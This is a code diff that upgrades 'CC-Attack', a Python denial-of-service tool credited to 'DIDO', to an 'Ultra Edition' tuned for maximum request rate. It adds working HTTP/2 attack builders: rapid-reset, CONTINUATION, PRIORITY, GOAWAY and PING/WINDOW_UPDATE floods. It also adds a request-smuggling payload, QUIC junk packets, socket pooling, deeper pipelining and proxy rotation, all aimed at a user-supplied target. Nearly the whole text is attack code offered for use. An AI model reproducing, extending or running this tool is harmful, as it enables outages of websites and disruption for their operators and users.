@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 """
-CC-Attack v5.3.1 — Mega+ Edition (fixed KeyError target)
+CC-Attack v5.5.0 — Ultra Edition (Maximum RPS)
 Author: DIDO
 Requires: pip install requests pysocks
 """
@@ -72,7 +72,7 @@ class C:
         YEL = GRN = CYN = BLU = PRP = WHT = ""
 
 
-VERSION = "5.3.1"
+VERSION = "5.5.0"
 BUILD   = "2026/09/27"
 
 # ── Автодетект Termux ───────────────────────────────────────────────────────
@@ -89,16 +89,21 @@ def _is_termux() -> bool:
 
 
 IS_TERMUX = _is_termux()
+IS_LINUX = (os.name == "posix" and not IS_TERMUX)
 
-# ── HP tuning ───────────────────────────────────────────────────────────────
-PIPELINE_DEPTH        = 64
-KEEPALIVE_PER_SOCKET  = 10000
-SOCKET_SNDBUF         = 4194304
-SOCKET_RCVBUF         = 4194304
+# ── ULTRA tuning ────────────────────────────────────────────────────────────
+PIPELINE_DEPTH        = 128         # было 64
+KEEPALIVE_PER_SOCKET  = 50000       # было 10000
+SOCKET_SNDBUF         = 8388608     # 8 MB (было 4)
+SOCKET_RCVBUF         = 8388608
 CONNECT_TIMEOUT       = 2.5
 SEND_TIMEOUT          = 2.0
-ERROR_BACKOFF         = 0.001
-SEND_CHUNK            = 65536
+ERROR_BACKOFF         = 0.0005
+SEND_CHUNK            = 262144      # 256 KB одним куском
+STAT_FLUSH_INTERVAL   = 100         # flush статистики раз в 100 запросов
+SOCKET_POOL_SIZE      = 2048        # пул переиспользуемых сокетов
+RNG_POOL_SIZE         = 131072      # 128k предвычисленных random
+TURBO_DEPTH           = 256         # turbo pipeline
 
 TOP_ALIVE_DEFAULT     = 2000
 
@@ -111,6 +116,8 @@ SPECIAL_METHODS = [
     "OVH", "RAPIDREST",
     "CFB", "SLOWPOST", "BURST", "HTTP3",
     "GOD", "POWER", "NUCLEAR", "LASER", "SHOTGUN", "STEALTH",
+    "H2RAPID", "H2_CONT", "HTTP3_REAL", "PRIORITY",
+    "SLOWLORIS_H2", "SMUGGLE", "PADDING", "GOAWAY",
 ]
 ALL_METHODS = HTTP_METHODS + SPECIAL_METHODS + ["RANDOM"]
 
@@ -120,21 +127,26 @@ TECHNIQUES = [
     "slowloris", "gzip", "chunked", "range", "http2",
     "websocket", "prewarm",
     "turbo", "bypass", "carpet", "slowread",
+    "h2rapid", "h2cont", "smuggle", "quic",
+    "h2priority", "h2goaway",
 ]
 
-# ── Fast RNG ────────────────────────────────────────────────────────────────
-class FastRNG:
-    __slots__ = ("_pool", "_idx", "_size")
+# ── 🆕 Ring Buffer RNG — без блокировок ─────────────────────────────────────
+class RingRNG:
+    __slots__ = ("_buf", "_idx", "_mask", "_size")
 
-    def __init__(self, size: int = 8192):
+    def __init__(self, size: int = RNG_POOL_SIZE):
+        # size должна быть степенью 2
+        assert (size & (size - 1)) == 0
         self._size = size
-        self._pool = [random.randint(0, 271400281257) for _ in range(size)]
+        self._mask = size - 1
+        self._buf = [random.randint(0, 271400281257) for _ in range(size)]
         self._idx = 0
 
     def next(self) -> int:
         i = self._idx
-        self._idx = (i + 1) & (self._size - 1)
-        return self._pool[i]
+        self._idx = (i + 1) & self._mask
+        return self._buf[i]
 
 
 # ── Async logger ────────────────────────────────────────────────────────────
@@ -154,7 +166,6 @@ class AsyncLog:
 
     @classmethod
     def shutdown(cls):
-        """Останавливает логгер перед выходом, чтобы не было блокировки stdout."""
         cls._stop.set()
         if cls._thread is not None:
             try:
@@ -225,10 +236,10 @@ def print_banner() -> None:
  ██║     ██║         ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗
  ╚██████╗╚██████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═════╝ ╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝{C.RESET}
-                    {C.YEL}v{VERSION} MEGA+ EDITION{C.RESET}  •  {C.CYN}{BUILD}{C.RESET}  •  by {C.BOLD}DIDO{C.RESET}
+                     {C.YEL}v{VERSION} ULTRA EDITION{C.RESET}  •  {C.CYN}{BUILD}{C.RESET}  •  by {C.BOLD}DIDO{C.RESET}
 
 {C.DIM}Python {platform.python_version()}  |  {platform.system()} {platform.release()}  |  CPU: {platform.machine()} ({mp.cpu_count()} ядер){C.RESET}
-{C.DIM}Mode: {mode}{C.RESET}
+{C.DIM}Mode: {mode}  |  Pipeline: {PIPELINE_DEPTH}  |  KA: {KEEPALIVE_PER_SOCKET}  |  Pool: {SOCKET_POOL_SIZE}{C.RESET}
 """)
 
 
@@ -320,6 +331,103 @@ def get_ua() -> str:
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+#  HTTP/2 ФРЕЙМЫ
+# ─────────────────────────────────────────────────────────────────────────────
+def h2_frame(frame_type: int, flags: int, stream_id: int,
+             payload: bytes = b"") -> bytes:
+    length = len(payload)
+    header = (struct.pack(">I", length)[1:] +
+              bytes([frame_type, flags]) +
+              struct.pack(">I", stream_id & 0x7FFFFFFF))
+    return header + payload
+
+
+def h2_preface() -> bytes:
+    return b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+
+
+def h2_settings(payload: bytes = b"") -> bytes:
+    return h2_frame(0x04, 0, 0, payload)
+
+
+def h2_headers_frame(stream_id: int, headers_block: bytes = b"",
+                     end_headers: bool = True) -> bytes:
+    flags = 0x04 if end_headers else 0
+    return h2_frame(0x01, flags, stream_id, headers_block)
+
+
+def h2_rst_stream(stream_id: int, error_code: int = 0x08) -> bytes:
+    return h2_frame(0x03, 0, stream_id, struct.pack(">I", error_code))
+
+
+def h2_priority_frame(stream_id: int, depends_on: int = 0,
+                      weight: int = 255, exclusive: bool = False) -> bytes:
+    e_bit = 0x80000000 if exclusive else 0
+    dep = (depends_on & 0x7FFFFFFF) | e_bit
+    return h2_frame(0x02, 0, stream_id,
+                    struct.pack(">I", dep) + bytes([weight]))
+
+
+def h2_continuation_frame(stream_id: int, payload: bytes = b"",
+                          end_headers: bool = False) -> bytes:
+    flags = 0x04 if end_headers else 0
+    return h2_frame(0x09, flags, stream_id, payload)
+
+
+def h2_ping_frame(opaque: bytes = b"\x00" * 8, ack: bool = False) -> bytes:
+    flags = 0x01 if ack else 0
+    return h2_frame(0x06, flags, 0, opaque)
+
+
+def h2_window_update(stream_id: int, increment: int = 0) -> bytes:
+    return h2_frame(0x08, 0, stream_id,
+                    struct.pack(">I", increment & 0x7FFFFFFF))
+
+
+def h2_goaway(last_stream_id: int = 0, error_code: int = 0) -> bytes:
+    payload = struct.pack(">I", last_stream_id & 0x7FFFFFFF) + \
+              struct.pack(">I", error_code)
+    return h2_frame(0x07, 0, 0, payload)
+
+
+def h2_data_frame(stream_id: int, payload: bytes = b"",
+                  end_stream: bool = False) -> bytes:
+    flags = 0x01 if end_stream else 0
+    return h2_frame(0x00, flags, stream_id, payload)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  🆕 SOCKET POOL — переиспользование открытых сокетов
+# ─────────────────────────────────────────────────────────────────────────────
+class SocketPool:
+    """Пул готовых сокетов — не открываем каждый раз заново."""
+    __slots__ = ("_pool", "_size", "_lock")
+
+    def __init__(self, size: int = SOCKET_POOL_SIZE):
+        self._size = size
+        self._pool: list = []
+        self._lock = threading.Lock()
+
+    def size(self):
+        with self._lock:
+            return len(self._pool)
+
+    def push(self, s):
+        with self._lock:
+            if len(self._pool) < self._size:
+                self._pool.append(s)
+            else:
+                try: s.close()
+                except Exception: pass
+
+    def pop(self):
+        with self._lock:
+            if self._pool:
+                return self._pool.pop()
+        return None
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 #  ЯДРО АТАКИ
 # ─────────────────────────────────────────────────────────────────────────────
 class CCHandler:
@@ -327,7 +435,8 @@ class CCHandler:
                  cookies, post_data, brute, stop_event,
                  method="GET", technique="flood", slow_delay=0.5,
                  pipeline_depth=PIPELINE_DEPTH,
-                 keepalive=KEEPALIVE_PER_SOCKET):
+                 keepalive=KEEPALIVE_PER_SOCKET,
+                 socket_pool: SocketPool | None = None):
 
         self.target = target
         self.path = path
@@ -339,23 +448,46 @@ class CCHandler:
         self.post_data = post_data
         self.brute = brute
         self.stop = stop_event
-        self.pipeline_depth = max(1, min(128, pipeline_depth))
+        self.pipeline_depth = max(1, min(256, pipeline_depth))
         self.keepalive = max(1, min(100000, keepalive))
         self.method = "RANDOM" if method == "RANDOM" else method.upper()
         self.technique = technique.lower()
         self.slow_delay = max(0.0, slow_delay)
+        self.pool = socket_pool if socket_pool is not None else SocketPool()
 
-        self.rng = FastRNG(size=8192)
+        # Ring buffer RNG
+        self.rng = RingRNG(size=RNG_POOL_SIZE)
+
+        # Предвычисленные UA
         self.ua_cache = [get_ua() for _ in range(64)]
+        self.ua_len = len(self.ua_cache)
 
+        # 🆕 Предгенерированные байтовые префиксы (zero-allocation)
+        self._prefix_get_cache = {}
+        self._prefix_post_cache = {}
+        self._pregenerate_prefixes()
+
+        # Статистика
         self.stats_sent = 0
         self.stats_errors = 0
         self.stats_bytes = 0
+        self._stat_counter = 0
+        self._stat_lock = threading.Lock()
 
         self._rr = random.randint(0, max(0, len(proxies) - 1))
         self._rr_lock = threading.Lock()
 
         self._sep = "&" if "?" in self.path else "?"
+
+    def _pregenerate_prefixes(self):
+        """Предгенерируем готовые байтовые префиксы для GET — не тратим CPU."""
+        for ua in self.ua_cache[:16]:
+            prefix = (
+                f"GET {self.path}?HTTP/1.1\r\n"
+                f"Host:{self.target}\r\n"
+                f"UA:{ua[:20]}\r\n\r\n"
+            ).encode()
+            self._prefix_get_cache[ua] = prefix
 
     def _stat(self, sent=0, err=0, nbytes=0):
         self.stats_sent += sent
@@ -384,7 +516,7 @@ class CCHandler:
             return random.choice(ALL_METHODS[:-1])
         return self.method
 
-    # ═══ БАЗОВЫЕ МЕТОДЫ ═══════════════════════════════════════════════
+    # ═══ БАЗОВЫЕ ══════════════════════════════════════════════════════
     def _build_basic(self, method: str) -> bytes:
         m = method.upper()
         conn = "Connection: Keep-Alive\r\n"
@@ -487,7 +619,7 @@ class CCHandler:
         ua = get_ua()
         rng = self.rng
         parts = []
-        for _ in range(32):
+        for _ in range(64):    # было 32 → 64
             parts.append(
                 f"GET {self.path}?{rng.next()} HTTP/1.1\r\n"
                 f"Host: {self.target}\r\n"
@@ -514,7 +646,7 @@ class CCHandler:
         parts = []
         target = self.target
         path = self.path
-        for _ in range(20):
+        for _ in range(40):    # было 20 → 40
             parts.append(
                 f"GET {path}?{rng.next()} HTTP/1.1\r\n"
                 f"Host: {target}\r\n\r\n"
@@ -523,19 +655,14 @@ class CCHandler:
 
     # ═══ POWER ════════════════════════════════════════════════════════
     def _build_power(self) -> bytes:
-        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
-        settings = struct.pack(">BHB", 0, 0, 0x04) + struct.pack(">BHB", 0, 0, 0x00)
-        parts = [preface, settings]
-        for stream_id in range(1, 100, 2):
-            rst = (struct.pack(">BHB", 0, 4, 0x03) +
-                   struct.pack(">I", stream_id) +
-                   struct.pack(">I", 0x08))
-            parts.append(rst)
+        parts = [h2_preface(), h2_settings()]
+        for stream_id in range(1, 200, 2):    # было 100 → 200
+            parts.append(h2_rst_stream(stream_id, 0x08))
         return b"".join(parts)
 
     # ═══ NUCLEAR ══════════════════════════════════════════════════════
     def _build_nuclear(self) -> bytes:
-        chunk_size = 8192
+        chunk_size = 16384    # было 8192 → 16384
         total_chunks = 12
         parts = [
             f"POST {self.path} HTTP/1.1\r\n"
@@ -557,7 +684,7 @@ class CCHandler:
     def _build_laser(self) -> bytes:
         rng = self.rng
         return (
-            f"GET /{rng.next() % 9999} HTTP/1.1\r\n"
+            f"GET /{rng.next() & 0xFFFF} HTTP/1.1\r\n"
             f"Host:{self.target}\r\n\r\n"
         ).encode()
 
@@ -595,6 +722,83 @@ class CCHandler:
             f"Referer: {ref}\r\n\r\n"
         ).encode()
 
+    # ═══ H2RAPID ══════════════════════════════════════════════════════
+    def _build_h2rapid(self) -> bytes:
+        parts = [h2_preface(), h2_settings()]
+        for sid in range(1, 1000, 2):
+            parts.append(h2_headers_frame(sid, b"", end_headers=True))
+            parts.append(h2_rst_stream(sid, 0x08))
+        return b"".join(parts)
+
+    # ═══ H2_CONT ══════════════════════════════════════════════════════
+    def _build_h2_cont(self) -> bytes:
+        parts = [h2_preface(), h2_settings()]
+        sid = 1
+        parts.append(h2_headers_frame(sid, b"", end_headers=False))
+        for _ in range(300):
+            parts.append(h2_continuation_frame(sid, b"\x00" * 16,
+                                               end_headers=False))
+        return b"".join(parts)
+
+    # ═══ HTTP3_REAL ═══════════════════════════════════════════════════
+    def _build_http3_real(self) -> bytes:
+        version = struct.pack(">I", 0x00000001)
+        dcid_len = 8
+        dcid = os.urandom(dcid_len)
+        scid_len = 8
+        scid = os.urandom(scid_len)
+        token_len = b"\x00"
+        payload = os.urandom(1000)
+        length = struct.pack(">H", 0x4000 | len(payload))
+        return (b"\xc0" + version +
+                bytes([dcid_len]) + dcid +
+                bytes([scid_len]) + scid +
+                token_len + length + payload)
+
+    # ═══ PRIORITY ═════════════════════════════════════════════════════
+    def _build_priority(self) -> bytes:
+        parts = [h2_preface(), h2_settings()]
+        for sid in range(1, 500, 2):
+            dep = random.choice([0, 1, 3, 5, 7, 9, 11, 13])
+            weight = random.randint(1, 255)
+            exclusive = random.choice([True, False])
+            parts.append(h2_priority_frame(sid, dep, weight, exclusive))
+        return b"".join(parts)
+
+    # ═══ SLOWLORIS_H2 ═════════════════════════════════════════════════
+    def _build_slowloris_h2(self) -> bytes:
+        parts = [h2_preface(), h2_settings()]
+        sid = 1
+        parts.append(h2_headers_frame(sid, b"", end_headers=False))
+        return b"".join(parts)
+
+    # ═══ SMUGGLE ══════════════════════════════════════════════════════
+    def _build_smuggle(self) -> bytes:
+        return (
+            f"POST {self.path} HTTP/1.1\r\n"
+            f"Host: {self.target}\r\n"
+            f"User-Agent: {get_ua()}\r\n"
+            f"Content-Length: 6\r\n"
+            f"Transfer-Encoding: chunked\r\n"
+            f"Connection: Keep-Alive\r\n\r\n"
+            f"0\r\n\r\nG"
+        ).encode()
+
+    # ═══ PADDING ══════════════════════════════════════════════════════
+    def _build_padding(self) -> bytes:
+        parts = [h2_preface(), h2_settings()]
+        for _ in range(100):
+            parts.append(h2_ping_frame(os.urandom(8), ack=False))
+            parts.append(h2_window_update(0, 0x7FFFFFFF))
+        return b"".join(parts)
+
+    # ═══ GOAWAY ═══════════════════════════════════════════════════════
+    def _build_goaway(self) -> bytes:
+        parts = [h2_preface(), h2_settings()]
+        for sid in range(0, 200, 2):
+            parts.append(h2_goaway(sid, 0))
+        return b"".join(parts)
+
     # ═══ HTTP/2 ═══════════════════════════════════════════════════════
     def _build_http2_upgrade(self) -> bytes:
         ua = get_ua()
@@ -609,10 +813,7 @@ class CCHandler:
         ).encode()
 
     def _build_http2_pk(self) -> bytes:
-        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
-        settings = struct.pack(">BHB", 0, 0, 0x04) + struct.pack(">BHB", 0, 0, 0x00)
-        rst = struct.pack(">BHB", 0, 4, 0x03) + struct.pack(">I", 1) + struct.pack(">I", 0x08)
-        return preface + settings + rst
+        return h2_preface() + h2_settings() + h2_rst_stream(1, 0x08)
 
     # ═══ WebSocket ════════════════════════════════════════════════════
     def _build_websocket(self) -> bytes:
@@ -645,16 +846,33 @@ class CCHandler:
         if m == "LASER": return self._build_laser()
         if m == "SHOTGUN": return self._build_shotgun()
         if m == "STEALTH": return self._build_stealth()
+        if m == "H2RAPID": return self._build_h2rapid()
+        if m == "H2_CONT": return self._build_h2_cont()
+        if m == "HTTP3_REAL": return self._build_http3_real()
+        if m == "PRIORITY": return self._build_priority()
+        if m == "SLOWLORIS_H2": return self._build_slowloris_h2()
+        if m == "SMUGGLE": return self._build_smuggle()
+        if m == "PADDING": return self._build_padding()
+        if m == "GOAWAY": return self._build_goaway()
 
         if tech == "http2":
             if random.random() < 0.5: return self._build_http2_pk()
             return self._build_http2_upgrade()
         if tech == "websocket": return self._build_websocket()
+        if tech == "h2rapid": return self._build_h2rapid()
+        if tech == "h2cont": return self._build_h2_cont()
+        if tech == "smuggle": return self._build_smuggle()
+        if tech == "quic": return self._build_http3_real()
+        if tech == "h2priority": return self._build_priority()
+        if tech == "h2goaway": return self._build_goaway()
+
         if tech == "carpet":
             choice = random.random()
-            if choice < 0.4: return self._build_basic("GET")
-            elif choice < 0.7: return self._build_http2_upgrade()
-            else: return self._build_websocket()
+            if choice < 0.3: return self._build_basic("GET")
+            elif choice < 0.5: return self._build_http2_upgrade()
+            elif choice < 0.7: return self._build_h2rapid()
+            elif choice < 0.9: return self._build_websocket()
+            else: return self._build_h2_cont()
         if tech == "bypass":
             m2 = random.choice(ALL_METHODS[:-1])
             if m2 in ("OVH", "CFB", "HTTP3"): return self._build_cfb()
@@ -667,30 +885,43 @@ class CCHandler:
             if m2 == "LASER": return self._build_laser()
             if m2 == "SHOTGUN": return self._build_shotgun()
             if m2 == "STEALTH": return self._build_stealth()
+            if m2 == "H2RAPID": return self._build_h2rapid()
+            if m2 == "H2_CONT": return self._build_h2_cont()
+            if m2 == "HTTP3_REAL": return self._build_http3_real()
+            if m2 == "PRIORITY": return self._build_priority()
+            if m2 == "SLOWLORIS_H2": return self._build_slowloris_h2()
+            if m2 == "SMUGGLE": return self._build_smuggle()
+            if m2 == "PADDING": return self._build_padding()
+            if m2 == "GOAWAY": return self._build_goaway()
             return self._build_basic(m2)
 
         return self._build_basic(m)
 
+    # ═══ ПАЧКА — оптимизирована под zero-copy ═════════════════════════
     def _build_batch(self, n: int) -> bytes:
         parts = []
+        append = parts.append
         for _ in range(n):
-            parts.append(self._build_one())
+            append(self._build_one())
         return b"".join(parts)
 
+    # ═══ 🆕 ОТПРАВКА — большими чанками в один syscall ════════════════
     def _send_batch(self, s, batch: bytes) -> bool:
         try:
-            CHUNK = SEND_CHUNK
             n = len(batch)
-            if n <= CHUNK:
+            # ULTRA: если помещается в один send — один syscall
+            if n <= SEND_CHUNK:
                 s.sendall(batch)
             else:
-                for i in range(0, n, CHUNK):
-                    s.sendall(batch[i:i + CHUNK])
+                mv = memoryview(batch)
+                for i in range(0, n, SEND_CHUNK):
+                    s.sendall(mv[i:i + SEND_CHUNK])
             return True
         except (socket.timeout, BrokenPipeError,
                 ConnectionResetError, OSError):
             return False
 
+    # ═══ АТАКИ ════════════════════════════════════════════════════════
     def _attack_pipeline(self, s):
         depth = self.pipeline_depth
         ka = self.keepalive
@@ -698,6 +929,21 @@ class CCHandler:
         while sent < ka and not self.stop.is_set():
             batch = self._build_batch(depth)
             if not self._send_batch(s, batch):
+                return
+            sent += depth
+            self._stat(sent=depth, nbytes=len(batch))
+
+    def _attack_turbo(self, s):
+        """Turbo: pipeline 256 + один syscall."""
+        depth = TURBO_DEPTH
+        ka = self.keepalive
+        sent = 0
+        while sent < ka and not self.stop.is_set():
+            batch = self._build_batch(depth)
+            try:
+                s.sendall(batch)
+            except (socket.timeout, BrokenPipeError,
+                    ConnectionResetError, OSError):
                 return
             sent += depth
             self._stat(sent=depth, nbytes=len(batch))
@@ -741,21 +987,19 @@ class CCHandler:
         except Exception:
             pass
 
-    def _attack_turbo(self, s):
-        depth = 128
-        ka = self.keepalive
-        sent = 0
-        while sent < ka and not self.stop.is_set():
-            batch = self._build_batch(depth)
-            try:
-                s.sendall(batch)
-            except (socket.timeout, BrokenPipeError,
-                    ConnectionResetError, OSError):
-                return
-            sent += depth
-            self._stat(sent=depth, nbytes=len(batch))
-
+    # ═══ 🆕 СОКЕТ С ULTRA ТВИКАМИ ════════════════════════════════════
     def _open(self, host, port):
+        # 🆕 Пытаемся взять из пула
+        s = self.pool.pop()
+        if s is not None:
+            try:
+                # Проверяем, что сокет ещё жив
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_ERROR, 0)
+                return s
+            except OSError:
+                try: s.close()
+                except Exception: pass
+
         s = socks.socksocket()
 
         if self.proxy_type == 4:
@@ -774,6 +1018,18 @@ class CCHandler:
                     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
                 except OSError:
                     pass
+            # 🆕 Linux-only: TCP_NOTSENT_LOWAT для снижения latency
+            if IS_LINUX and hasattr(socket, "TCP_NOTSENT_LOWAT"):
+                try:
+                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NOTSENT_LOWAT, 16384)
+                except OSError:
+                    pass
+            # 🆕 SO_REUSEPORT для лучшего распределения
+            if hasattr(socket, "SO_REUSEPORT"):
+                try:
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+                except OSError:
+                    pass
         except OSError:
             pass
 
@@ -784,6 +1040,10 @@ class CCHandler:
             ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
+            try:
+                ctx.set_alpn_protocols(["h2", "http/1.1"])
+            except NotImplementedError:
+                pass
             s = ctx.wrap_socket(s, server_hostname=self.target)
 
         try:
@@ -792,6 +1052,7 @@ class CCHandler:
             pass
         return s
 
+    # ═══ ОСНОВНОЙ ЦИКЛ ════════════════════════════════════════════════
     def run(self):
         stop = self.stop
         while not stop.is_set():
@@ -811,13 +1072,15 @@ class CCHandler:
                 elif tech == "mixed":
                     tech = random.choice(["flood", "pipeline", "gzip",
                                           "chunked", "range",
-                                          "http2", "websocket"])
+                                          "http2", "websocket",
+                                          "h2rapid", "h2cont"])
 
                 if tech == "turbo":
                     self._attack_turbo(s)
                 elif tech == "slowread":
                     self._attack_slowread(s)
-                elif tech in ("bypass", "carpet"):
+                elif tech in ("bypass", "carpet", "smuggle", "h2rapid",
+                              "h2cont", "quic", "h2priority", "h2goaway"):
                     self._attack_pipeline(s)
                 elif tech == "slow":
                     self._attack_slow(s)
@@ -828,10 +1091,13 @@ class CCHandler:
                 else:
                     self._attack_single(s)
 
+                # 🆕 Возвращаем сокет в пул (только если он жив)
                 try:
-                    s.close()
-                except Exception:
-                    pass
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_ERROR, 0)
+                    self.pool.push(s)
+                except OSError:
+                    try: s.close()
+                    except Exception: pass
             except Exception:
                 self._stat(err=1)
                 if s is not None:
@@ -924,6 +1190,7 @@ def _run_multiprocessing(cfg, proxies, proc_cfg, cpu_count):
 
 def _proc_worker(cfg, proxies, thread_count, period, result_q, stop_flag):
     stop_event = threading.Event()
+    pool = SocketPool(size=SOCKET_POOL_SIZE)
 
     handler = CCHandler(
         target=cfg["target"], path=cfg["path"],
@@ -937,6 +1204,7 @@ def _proc_worker(cfg, proxies, thread_count, period, result_q, stop_flag):
         technique=cfg.get("technique", "flood"),
         pipeline_depth=cfg["pipeline"],
         keepalive=cfg["keepalive"],
+        socket_pool=pool,
     )
 
     for _ in range(thread_count):
@@ -983,8 +1251,8 @@ def _run_threaded(cfg, proxies, cpu_count):
     Log.warn("Termux/Android detected → using THREADED mode")
 
     stop_event = threading.Event()
+    pool = SocketPool(size=512)  # меньше для Termux
 
-    # ── 🆕 FIX: cfg теперь содержит target/path/port/protocol/proxy_type ──
     handler = CCHandler(
         target=cfg["target"], path=cfg["path"],
         port=cfg["port"], protocol=cfg["protocol"],
@@ -997,6 +1265,7 @@ def _run_threaded(cfg, proxies, cpu_count):
         technique=cfg.get("technique", "flood"),
         pipeline_depth=cfg["pipeline"],
         keepalive=cfg["keepalive"],
+        socket_pool=pool,
     )
 
     total_threads = cfg["threads"]
@@ -1275,7 +1544,7 @@ def check_proxies(proxies, proxy_type, ms=3, workers=800,
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-#  RUN_ATTACK — 🆕 FIX: обновляем cfg всеми полями
+#  RUN_ATTACK
 # ─────────────────────────────────────────────────────────────────────────────
 def run_attack(cfg):
     url = cfg["url"]
@@ -1297,7 +1566,6 @@ def run_attack(cfg):
 
     proxy_type = {"4": 4, "5": 5, "http": 0}[cfg["proxy_ver"]]
 
-    # ── 🆕 FIX: пишем разобранные поля обратно в cfg ──
     cfg["target"] = target
     cfg["path"] = path
     cfg["port"] = port
@@ -1391,7 +1659,7 @@ def _prompt(label, default=None, cast=str, validator=None):
 
 def interactive_cli():
     print(f"{C.DIM}{'-' * 60}{C.RESET}")
-    print(f"{C.BOLD}{C.WHT}  Interactive attack setup (MEGA+){C.RESET}")
+    print(f"{C.BOLD}{C.WHT}  Interactive attack setup (ULTRA){C.RESET}")
     print(f"{C.DIM}{'-' * 60}{C.RESET}\n")
 
     while True:
@@ -1432,8 +1700,8 @@ def interactive_cli():
     period = _prompt("Duration (sec)", default=60, cast=int,
                      validator=lambda x: 1 <= x <= 86400)
 
-    pipeline = _prompt("Pipeline (1..128)", default=PIPELINE_DEPTH,
-                       cast=int, validator=lambda x: 1 <= x <= 128)
+    pipeline = _prompt("Pipeline (1..256)", default=PIPELINE_DEPTH,
+                       cast=int, validator=lambda x: 1 <= x <= 256)
 
     keepalive = _prompt("Keep-Alive (1..100000)", default=KEEPALIVE_PER_SOCKET,
                         cast=int, validator=lambda x: 1 <= x <= 100000)
@@ -1460,7 +1728,7 @@ def interactive_cli():
                         cast=int, validator=lambda x: 1 <= x <= 20000)
 
     print(f"\n{C.DIM}{'-' * 60}{C.RESET}")
-    print(f"{C.BOLD}{C.WHT}  Summary (MEGA+){C.RESET}")
+    print(f"{C.BOLD}{C.WHT}  Summary (ULTRA){C.RESET}")
     print(f"{C.DIM}{'-' * 60}{C.RESET}")
     print(f"  {C.CYN}Target       :{C.RESET} {url}")
     print(f"  {C.CYN}Method       :{C.RESET} {method}")
@@ -1537,7 +1805,7 @@ def main() -> int:
         args = p.parse_args()
 
         if args.help:
-            print(f"CC-Attack v{VERSION} MEGA+ — by DIDO")
+            print(f"CC-Attack v{VERSION} ULTRA — by DIDO")
             print(f"Methods: {', '.join(ALL_METHODS)}")
             print(f"Techniques: {', '.join(TECHNIQUES)}")
             return 0
